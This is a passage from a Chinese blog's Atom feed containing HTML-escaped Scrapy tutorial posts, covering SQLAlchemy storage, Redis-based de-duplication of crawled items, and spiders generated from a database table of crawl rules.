    
      Metrics，谷歌翻译就是度量的意思。当我们需要为某个系统某个服务做监控、做统计，就需要用到Metrics。
    
    </summary>
    
      <category term="程序设计" scheme="http://wuchong.me/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    
      <category term="metrics" scheme="http://wuchong.me/tags/metrics/"/>
    
      <category term="教程" scheme="http://wuchong.me/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>使用Redis和SQLAlchemy对Scrapy Item去重并存储</title>
    <link href="http://wuchong.me/blog/2015/05/22/using-redis-and-sqlalchemy-to-checkd-dup-and-store-scrapy-item/"/>
    <id>http://wuchong.me/blog/2015/05/22/using-redis-and-sqlalchemy-to-checkd-dup-and-store-scrapy-item/</id>
    <published>2015-05-22T15:08:53.000Z</published>
    <updated>2016-03-08T12:20:29.000Z</updated>
    
    <content type="html">&lt;p&gt;在上篇&lt;a href=&quot;/blog/2015/05/22/running-scrapy-dynamic-and-configurable&quot;&gt;博客&lt;/a&gt;中，我们讲解了如何通过维护多个网站的爬取规则来抓取各个网站的数据。本文将简要地谈谈如何使用Scrapy的&lt;a href=&quot;https://scrapy-chs.readthedocs.org/zh_CN/0.24/topics/item-pipeline.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Item Pipline&lt;/a&gt;将爬取的数据去重并存储到数据库中。&lt;/p&gt;
&lt;p&gt;Scrapy框架的高度灵活性得益于其数据管道的架构设计，开发者可以通过简单的配置就能轻松地添加新特性。我们可以通过如下的方式添加一个pipline。&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;settings.set(&lt;span class=&quot;string&quot;&gt;&quot;ITEM_PIPELINES&quot;&lt;/span&gt;, &amp;#123;&lt;span class=&quot;string&quot;&gt;&#39;pipelines.DataBasePipeline&#39;&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;300&lt;/span&gt;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里&lt;code&gt;ITEM_PIPELINES&lt;/code&gt;是一个Python字典，其中key保存的pipline类在项目中的位置，value为整型值，确定了他们运行的顺序，item按数字从低到高的顺序，通过pipeline，通常将这些数字定义在0-1000范围内。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;存储到数据库&quot;&gt;&lt;a href=&quot;#存储到数据库&quot; class=&quot;headerlink&quot; title=&quot;存储到数据库&quot;&gt;&lt;/a&gt;存储到数据库&lt;/h2&gt;&lt;p&gt;在上一篇&lt;a href=&quot;/blog/2015/05/22/running-scrapy-dynamic-and-configurable&quot;&gt;博客&lt;/a&gt;中，我们已经介绍了使用&lt;a href=&quot;http://www.sqlalchemy.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;SQLAlchemy&lt;/a&gt; 作为我们的ORM。同样的，为了将爬取的文章保存到数据库，我们先要有一个&lt;code&gt;Article&lt;/code&gt;模型，包含了 URL，标题，正文等字段。&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; sqlalchemy &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; Column, String , DateTime, Integer&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; sqlalchemy.ext.declarative &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; declarative_base&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Base = declarative_base()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Article&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(Base)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    __tablename__ = &lt;span class=&quot;string&quot;&gt;&#39;articles&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    id = Column(Integer, primary_key=&lt;span class=&quot;keyword&quot;&gt;True&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    title = Column(String)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    url = Column(String)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    body = Column(String)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    publish_time = Column(DateTime)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    source_site = Column(String)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;之后在&lt;code&gt;DataBasePipeline&lt;/code&gt;中，我们需要生成&lt;code&gt;Aticle&lt;/code&gt;对象，并将item中对应的字段赋给&lt;code&gt;Aticle&lt;/code&gt;对象，最后通过SQLAlchemy将文章插入到数据库中。&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; model.config &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; DBSession&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; model.article &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; Article&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;DataBasePipeline&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(object)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;open_spider&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(self, spider)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        self.session = DBSession()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;process_item&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(self, item, spider)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        a = Article(title=item[&lt;span class=&quot;string&quot;&gt;&quot;title&quot;&lt;/span&gt;].encode(&lt;span class=&quot;string&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    url=item[&lt;span class=&quot;string&quot;&gt;&quot;url&quot;&lt;/span&gt;],&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    body=item[&lt;span class=&quot;string&quot;&gt;&quot;body&quot;&lt;/span&gt;].encode(&lt;span class=&quot;string&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    publish_time=item[&lt;span class=&quot;string&quot;&gt;&quot;publish_time&quot;&lt;/span&gt;].encode(&lt;span class=&quot;string&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    source_site=item[&lt;span class=&quot;string&quot;&gt;&quot;source_site&quot;&lt;/span&gt;].encode(&lt;span class=&quot;string&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        self.session.add(a)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        self.session.commit()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;close_spider&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(self,spider)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        self.session.close()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;使用Redis去重&quot;&gt;&lt;a href=&quot;#使用Redis去重&quot; class=&quot;headerlink&quot; title=&quot;使用Redis去重&quot;&gt;&lt;/a&gt;使用Redis去重&lt;/h2&gt;&lt;p&gt;为了防止同一个网页爬取两遍，我们使用Redis来去重，因为 Redis 作为Key/Value数据库在这个场景是非常适合的。我们认为一个URL能唯一代表一个网页。所以使用URL作为键值存储。&lt;/p&gt;
&lt;p&gt;我们希望在存储之前就进行去重操作，所以需要更改下&lt;code&gt;ITEM_PIPELINES&lt;/code&gt;的配置。&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;settings.set(&lt;span class=&quot;string&quot;&gt;&quot;ITEM_PIPELINES&quot;&lt;/span&gt; , &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&#39;pipelines.DuplicatesPipeline&#39;&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;200&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&#39;pipelines.DataBasePipeline&#39;&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;300&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;DuplicatesPipeline&lt;/code&gt;长这个样子。&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; scrapy.exceptions &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; DropItem&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; model.config &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; Redis&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;DuplicatesPipeline&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(object)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;process_item&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(self, item, spider)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; Redis.exists(&lt;span class=&quot;string&quot;&gt;&#39;url:%s&#39;&lt;/span&gt; % item[&lt;span class=&quot;string&quot;&gt;&#39;url&#39;&lt;/span&gt;]):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;raise&lt;/span&gt; DropItem(&lt;span class=&quot;string&quot;&gt;&quot;Duplicate item found: %s&quot;&lt;/span&gt; % item)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            Redis.set(&lt;span class=&quot;string&quot;&gt;&#39;url:%s&#39;&lt;/span&gt; % item[&lt;span class=&quot;string&quot;&gt;&#39;url&#39;&lt;/span&gt;],&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; item&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当检测到Item已经存在，会抛出DropItem 异常，被丢弃的item将不会被之后的pipeline组件所处理。&lt;/p&gt;
&lt;p&gt;最后，运行脚本，你能看到我们的程序欢快地跑起来了。&lt;/p&gt;
&lt;figure class=&quot;highlight vim&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;python&lt;/span&gt; run.&lt;span class=&quot;keyword&quot;&gt;py&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;你可以在 &lt;a href=&quot;https://github.com/wuchong/scrapy-dynamic-configurable/tree/scrapy-0.24&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;GitHub&lt;/a&gt; 上看到本文的完整项目。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;注：本文使用的 Scrapy 版本是 0.24，&lt;a href=&quot;https://github.com/wuchong/scrapy-dynamic-configurable&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;GitHub&lt;/a&gt; 上的master分支已支持 Scrapy 1.0&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;本系列的三篇文章&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;/blog/2015/05/22/running-scrapy-programmatically&quot;&gt;编程方式下运行 Scrapy spider&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/blog/2015/05/22/running-scrapy-dynamic-and-configurable&quot;&gt;使用Scrapy定制可动态配置的爬虫&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/blog/2015/05/22/using-redis-and-sqlalchemy-to-checkd-dup-and-store-scrapy-item&quot;&gt;使用Redis和SQLAlchemy对Scrapy Item去重并存储&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
</content>
    
    <summary type="html">
    
      本文将简要地谈谈如何使用Scrapy的Item Pipline，基于Redis和SQLALchemy将爬取的数据去重并存储到数据库中。
    
    </summary>
    
      <category term="程序设计" scheme="http://wuchong.me/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    
      <category term="爬虫" scheme="http://wuchong.me/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="scrapy" scheme="http://wuchong.me/tags/scrapy/"/>
    
      <category term="redis" scheme="http://wuchong.me/tags/redis/"/>
    
  </entry>
  
  <entry>
    <title>使用Scrapy定制可动态配置的爬虫</title>
    <link href="http://wuchong.me/blog/2015/05/22/running-scrapy-dynamic-and-configurable/"/>
    <id>http://wuchong.me/blog/2015/05/22/running-scrapy-dynamic-and-configurable/</id>
    <published>2015-05-22T14:22:20.000Z</published>
    <updated>2015-08-02T07:03:40.000Z</updated>
    
    <content type="html">&lt;p&gt;本文紧接上篇&lt;a href=&quot;/blog/2015/05/22/running-scrapy-programmatically&quot;&gt;博客&lt;/a&gt;，在上一篇博客中我们讲解了如何使用编程的方式运行Scrapy spider。本文将讲解如何通过维护多个网站的爬取规则来抓取各个网站的数据。&lt;/p&gt;
&lt;p&gt;具体要实现的目标是这样的，有一张&lt;code&gt;Rule&lt;/code&gt;表用来存储各个网站的爬取规则，Scrapy获取&lt;code&gt;Rule&lt;/code&gt;表中的记录后，针对每一条rule自动生成一个spider，每个spider去爬它们各自网站的数据。这样我们只需要维护Rule表中的规则（可以写个Web程序来维护），而不用针对上千个网站写上千个spider文件了。&lt;/p&gt;
&lt;p&gt;我们使用 &lt;a href=&quot;http://www.sqlalchemy.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;SQLAlchemy&lt;/a&gt; 来映射数据库，Rule表的结构如下：&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; sqlalchemy &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; Column, String , DateTime, Integer&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; sqlalchemy.ext.declarative &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; declarative_base&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Base = declarative_base()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Rule&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(Base)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    __tablename__ = &lt;span class=&quot;string&quot;&gt;&#39;rules&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    id = Column(Integer, primary_key=&lt;span class=&quot;keyword&quot;&gt;True&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    name = Column(String)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    allow_domains = Column(String)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    start_urls = Column(String)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    next_page = Column(String)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    allow_url = Column(String)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    extract_from = Column(String)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    title_xpath = Column(String)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    body_xpath = Column(String)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    publish_time_xpath = Column(String)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    source_site_xpath = Column(String)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    enable = Column(Integer)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;接下来我们要重新定制我们的spider，命名为&lt;code&gt;DeepSpider&lt;/code&gt;，让他能够通过rule参数初始化。我们令&lt;code&gt;DeepSpider&lt;/code&gt;继承自 &lt;a href=&quot;https://scrapy-chs.readthedocs.org/zh_CN/0.24/topics/spiders.html#crawlspider&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;CrawlSpider&lt;/code&gt;&lt;/a&gt;，一个提供了更多强大的规则(rule)来提供跟进link功能的类。&lt;code&gt;deep_spider.py&lt;/code&gt;长这个样子：&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; scrapy&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; scrapy.contrib.spiders &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; CrawlSpider, Rule&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; scrapy.contrib.linkextractors &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; LinkExtractor&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Article&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(scrapy.Item)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    title = scrapy.Field()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    url = scrapy.Field()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    body = scrapy.Field()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    publish_time = scrapy.Field()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    source_site = scrapy.Field()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;DeepSpider&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(CrawlSpider)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    name = &lt;span class=&quot;string&quot;&gt;&quot;Deep&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(self,rule)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        self.rule = rule&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        self.name = rule.name&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        self.allowed_domains = rule.allow_domains.split(&lt;span class=&quot;string&quot;&gt;&quot;,&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        self.start_urls = rule.start_urls.split(&lt;span class=&quot;string&quot;&gt;&quot;,&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        rule_list = []&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;#添加`下一页`的规则&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; rule.next_page:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            rule_list.append(Rule(LinkExtractor(restrict_xpaths = rule.next_page)))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;#添加抽取文章链接的规则&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        rule_list.append(Rule(LinkExtractor(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            allow=[rule.allow_url],&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            restrict_xpaths = [rule.extract_from]),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            callback=&lt;span class=&quot;string&quot;&gt;&#39;parse_item&#39;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        self.rules = tuple(rule_list)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        super(DeepSpider, self).__init__()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;parse_item&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(self, response)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        self.log(&lt;span class=&quot;string&quot;&gt;&#39;Hi, this is an article page! %s&#39;&lt;/span&gt; % response.url)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        article = Article()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        article[&lt;span class=&quot;string&quot;&gt;&quot;url&quot;&lt;/span&gt;] = response.url&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        title = response.xpath(self.rule.title_xpath).extract()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        article[&lt;span class=&quot;string&quot;&gt;&quot;title&quot;&lt;/span&gt;] = title[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;] &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; title &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        body = response.xpath(self.rule.body_xpath).extract()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        article[&lt;span class=&quot;string&quot;&gt;&quot;body&quot;&lt;/span&gt;] =  &lt;span class=&quot;string&quot;&gt;&#39;\n&#39;&lt;/span&gt;.join(body) &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; body &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        publish_time = response.xpath(self.rule.publish_time_xpath).extract()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        article[&lt;span class=&quot;string&quot;&gt;&quot;publish_time&quot;&lt;/span&gt;] = publish_time[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;] &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; publish_time &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        source_site = response.xpath(self.rule.source_site_xpath).extract()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        article[&lt;span 